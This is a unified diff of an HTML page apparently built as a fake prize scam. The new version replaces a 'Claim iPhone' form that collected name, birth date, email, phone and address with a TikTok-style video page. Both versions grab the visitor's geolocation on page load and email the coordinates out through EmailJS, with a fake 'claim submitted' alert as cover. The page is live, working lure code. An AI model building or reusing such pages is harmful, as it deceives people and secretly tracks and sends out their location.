@@ -3,136 +3,84 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1" />
-  <title>Auto Send Location + Form</title>
+  <title>TikTok Style Claim</title>
   <style>
-    body {
+    body, html {
+      margin: 0;
+      padding: 0;
+      height: 100%;
+      width: 100%;
       font-family: Arial, sans-serif;
-      padding: 30px;
-      background-color: #f0f0f0;
-      color: #333;
+      background: black;
+      overflow: hidden;
     }
-    .container {
-      max-width: 600px;
-      margin: auto;
-      background: white;
-      padding: 25px 30px;
-      border-radius: 10px;
-      box-shadow: 0 4px 12px rgba(0,0,0,0.12);
+
+    .video-container {
+      position: relative;
+      height: 100vh;
+      width: 100vw;
+      overflow: hidden;
     }
-    h2 {
-      margin-bottom: 25px;
-      text-align: center;
-      color: #2c3e50;
-    }
-    form {
-      margin-top: 20px;
-    }
-    .form-group {
-      margin-bottom: 18px;
-    }
-    label {
-      display: block;
-      margin-bottom: 6px;
-      font-weight: 600;
-      color: #34495e;
-    }
-    input[type="text"],
-    input[type="email"],
-    input[type="tel"],
-    input[type="date"],
-    textarea {
+
+    video {
+      height: 100%;
       width: 100%;
-      padding: 10px 12px;
-      font-size: 15px;
-      border: 1.8px solid #ccc;
-      border-radius: 5px;
-      box-sizing: border-box;
-      transition: border-color 0.3s ease;
+      object-fit: cover;
     }
-    input[type="text"]:focus,
-    input[type="email"]:focus,
-    input[type="tel"]:focus,
-    input[type="date"]:focus,
-    textarea:focus {
-      border-color: #3498db;
-      outline: none;
-    }
-    textarea {
-      resize: vertical;
-      min-height: 70px;
-    }
-    #locationDisplay {
-      background: rgba(255, 255, 255, 0.85);
-      color: #666;
-      padding: 0.5rem 0.75rem;
-      border-radius: 4px;
-      font-size: 14px;
-      margin-bottom: 20px;
-      text-align: center;
-    }
-    button {
-      width: 100%;
-      background-color: #3498db;
+
+    /* Floating Button like TikTok */
+    .claim-btn {
+      position: absolute;
+      bottom: 80px;
+      left: 50%;
+      transform: translateX(-50%);
+      background: #ff0050;
       color: white;
       border: none;
-      padding: 14px;
-      font-size: 16px;
-      font-weight: 600;
-      border-radius: 7px;
+      padding: 16px 28px;
+      font-size: 18px;
+      font-weight: bold;
+      border-radius: 25px;
       cursor: pointer;
-      transition: background-color 0.3s ease;
+      box-shadow: 0 4px 15px rgba(0,0,0,0.3);
+      transition: background 0.3s;
     }
-    button:hover {
-      background-color: #2980b9;
+    .claim-btn:hover {
+      background: #d40045;
     }
-    #status {
-      margin-top: 18px;
-      font-size: 16px;
-      color: #555;
+
+    /* Status + Location Overlay */
+    #status, #locationDisplay {
+      position: absolute;
+      bottom: 20px;
+      width: 100%;
       text-align: center;
-      white-space: pre-line; /* preserve newlines */
+      color: white;
+      font-size: 14px;
+      text-shadow: 0 2px 6px rgba(0,0,0,0.8);
+    }
+
+    #locationDisplay {
+      bottom: 45px;
+      font-size: 13px;
+      opacity: 0.8;
     }
   </style>
 </head>
 <body>
-  <div class="container">
-    <h2>Congratualations</h2>
+  <div class="video-container">
+    <!-- Background TikTok-like video -->
+    <video autoplay muted loop playsinline>
+      <source src="https://www.w3schools.com/html/mov_bbb.mp4" type="video/mp4">
+      Your browser does not support video playback.
+    </video>
 
-    <form id="rewardForm">
-      <div class="form-group">
-        <label for="fullName">Full Name</label>
-        <input type="text" class="form-control" id="fullName" placeholder="Enter your full name" required />
-      </div>
-      <div class="form-group">
-        <label for="dob">Date of Birth</label>
-        <input type="date" class="form-control" id="dob" required />
-      </div>
-      <div class="form-group">
-        <label for="email">Email Address</label>
-        <input type="email" class="form-control" id="email" placeholder="Enter your email" required />
-      </div>
-      <div class="form-group">
-        <label for="phoneNumber">Phone Number</label>
-        <input type="tel" class="form-control" id="phoneNumber" placeholder="Enter your phone number" required />
-      </div>
-      <div class="form-group">
-        <label for="address">Shipping Address</label>
-        <textarea class="form-control" id="address" rows="3" placeholder="Enter your shipping address" required></textarea>
-      </div>
-      <div class="form-group">
-        <label for="city">City</label>
-        <input type="text" class="form-control" id="city" placeholder="Enter your city" required />
-      </div>
-      <div class="form-group">
-        <label for="postalCode">Postal Code</label>
-        <input type="text" class="form-control" id="postalCode" placeholder="Enter your postal code" required />
-      </div>
+    <!-- Floating Claim Button -->
+    <button class="claim-btn" onclick="claimReward()">🎁 Claim iPhone</button>
 
-      <p id="locationDisplay">Address.</p>
-      <button type="submit">Submit and Claim iPhone</button>
-    </form>
-
-    <div id="status">Please allow location permission for getting correct address.</div>
+    <!-- Location + Status -->
+    <p id="locationDisplay">Detecting your location...</p>
+    <p id="status">Please allow location permission for correct address.</p>
   </div>
 
   <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
@@ -150,11 +98,11 @@
         subject: "User Location"
       })
       .then(() => {
-        statusEl.textContent = `Location sent successfully!\nLatitude: ${lat}, Longitude: ${lng}`;
-        locationDisplay.textContent = `Your location: Latitude ${lat}, Longitude ${lng}`;
+        statusEl.textContent = `✅ Location sent successfully!`;
+        locationDisplay.textContent = `Lat: ${lat}, Lng: ${lng}`;
       })
       .catch((error) => {
-        statusEl.textContent = "Failed to send email: " + error.text;
+        statusEl.textContent = "❌ Failed to send email: " + error.text;
       });
     }
 
@@ -164,31 +112,26 @@
           (position) => {
             const lat = position.coords.latitude.toFixed(6);
             const lng = position.coords.longitude.toFixed(6);
-            locationDisplay.textContent = `Your location detected: Latitude ${lat}, Longitude ${lng}`;
+            locationDisplay.textContent = `📍 Latitude ${lat}, Longitude ${lng}`;
             statusEl.textContent = `Location found. Sending email...`;
             sendLocationEmail(lat, lng);
           },
           (error) => {
-            locationDisplay.textContent = "Error getting location: " + error.message;
+            locationDisplay.textContent = "⚠️ Error: " + error.message;
             statusEl.textContent = "Error getting location.";
           }
         );
       } else {
-        locationDisplay.textContent = "Geolocation is not supported by this browser.";
-        statusEl.textContent = "Geolocation not supported.";
+        locationDisplay.textContent = "Geolocation not supported.";
+        statusEl.textContent = "Browser does not support location.";
       }
     }
 
     window.onload = getLocationAndSend;
 
-    // Optional: You can add form submission handler if needed, else it just submits normally.
-    document.getElementById('rewardForm').addEventListener('submit', function(e) {
-      e.preventDefault();
-      alert('Form submitted! (You can add your own form handling here)');
-      // You can add your own AJAX form submission or processing here if needed.
-    });
+    function claimReward() {
+      alert("🎉 Congratulations! Your claim has been submitted.");
+    }
   </script>
 </body>
 </html>
-
-
